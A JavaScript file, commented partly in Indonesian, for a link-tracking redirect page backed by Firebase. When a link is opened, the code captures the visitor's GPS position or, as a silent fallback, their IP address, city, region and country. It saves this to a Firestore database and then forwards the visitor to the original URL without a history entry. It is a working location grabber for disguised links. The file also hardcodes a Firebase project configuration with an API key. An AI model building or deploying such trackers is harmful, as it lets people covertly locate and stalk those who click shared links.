// Import Firebase v9+ modules
import { initializeApp } from "https://www.gstatic.com/firebasejs/9.0.0/firebase-app.js";
import { getFirestore, collection, addDoc, doc, getDoc } from "https://www.gstatic.com/firebasejs/9.0.0/firebase-firestore.js"; // Tambahkan doc dan getDoc

// Your Firebase config (tetap sama)
const firebaseConfig = {
  apiKey: "AIzaSyCjWoCpYuI_6FioPdzIns4m5MvqlHi_G8c",
  authDomain: "location-tracker-d5deb.firebaseapp.com",
  projectId: "location-tracker-d5deb",
  storageBucket: "location-tracker-d5deb.firebasestorage.app",
  messagingSenderId: "721420387193",
  appId: "1:721420387193:web:c039623b66fa6f0d0c25a8",
  measurementId: "G-WJNL7BP9G4"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

// Tampilkan pesan loading awal
document.body.innerText = "Tracking location and redirecting...";

// Get the unique ID from the URL
const urlParams = new URLSearchParams(window.location.search);
const uniqueId = urlParams.get('id');

// Jika tidak ada ID, hentikan proses
if (!uniqueId) {
  document.body.innerText = "Error: Tracking ID not found in URL.";
} else {
  // Mulai proses pelacakan lokasi
  trackLocationAndRedirect();
}

async function trackLocationAndRedirect() {
  try {
    // 1. Coba dapatkan lokasi via GPS
    const position = await new Promise((resolve, reject) => {
      navigator.geolocation.getCurrentPosition(resolve, reject, {
        enableHighAccuracy: true, // Coba akurasi tinggi
        timeout: 10000,         // Batas waktu 10 detik
        maximumAge: 0           // Jangan gunakan cache lokasi
      });
    });
    console.log("Location obtained via Geolocation API");
    const locationData = {
      id: uniqueId,
      lat: position.coords.latitude,
      lng: position.coords.longitude,
      accuracy: position.coords.accuracy,
      source: 'gps',
      timestamp: new Date().toISOString()
    };
    await sendToDatabase(locationData);

  } catch (geoError) {
    console.warn("Geolocation failed:", geoError.message, ". Falling back to IP lookup.");
    try {
      // 2. Jika GPS gagal, gunakan IP Lookup sebagai fallback
      const response = await fetch('https://ipapi.co/json/');
      if (!response.ok) {
          throw new Error(`IP API request failed with status ${response.status}`);
      }
      const ipData = await response.json();
      console.log("Location obtained via IP API");
      const locationData = {
        id: uniqueId,
        lat: ipData.latitude,
        lng: ipData.longitude,
        accuracy: null, // Akurasi tidak diketahui dari IP
        source: 'ip',
        ip: ipData.ip,
        city: ipData.city,
        region: ipData.region,
        country: ipData.country_name,
        timestamp: new Date().toISOString()
      };
      await sendToDatabase(locationData);

    } catch (ipError) {
      console.error("IP lookup failed:", ipError.message);
      // Opsional: Kirim data error jika pelacakan gagal total
      const errorData = {
        id: uniqueId,
        error: `Geolocation failed (${geoError.message}) and IP lookup failed (${ipError.message})`,
        source: 'error',
        timestamp: new Date().toISOString()
      };
      await sendToDatabase(errorData); // Tetap coba kirim error log
    }
  } finally {
      // 3. Selalu coba redirect, baik lokasi berhasil dilacak atau tidak
      await redirectToOriginalUrl();
  }
}


// Save location data to Firestore
async function sendToDatabase(data) {
  try {
    await addDoc(collection(db, "locations"), data);
    console.log("Location data saved successfully:", data);
  } catch (e) {
    console.error("Error adding location document: ", e);
    // Tidak menghentikan redirect, hanya log error
  }
}

// Fetch original URL and redirect
async function redirectToOriginalUrl() {
  try {
    const linkDocRef = doc(db, "links", uniqueId);
    const linkDocSnap = await getDoc(linkDocRef);

    if (linkDocSnap.exists()) {
      const linkData = linkDocSnap.data();
      const originalUrl = linkData.originalUrl;
      console.log("Original URL found:", originalUrl);
      if (originalUrl) {
        console.log("Redirecting to:", originalUrl);
        // Lakukan redirect
        window.location.replace(originalUrl); // replace() lebih baik dari href agar tidak masuk history browser
      } else {
        console.error("Original URL field is missing in the document for ID:", uniqueId);
        document.body.innerText = "Error: Original URL not found for this link.";
      }
    } else {
      console.error("No link document found for ID:", uniqueId);
      document.body.innerText = "Error: This tracking link is invalid or has been removed.";
    }
  } catch (e) {
    console.error("Error fetching link document or redirecting: ", e);
    document.body.innerText = "Error processing redirect. Please try again later.";
  }
}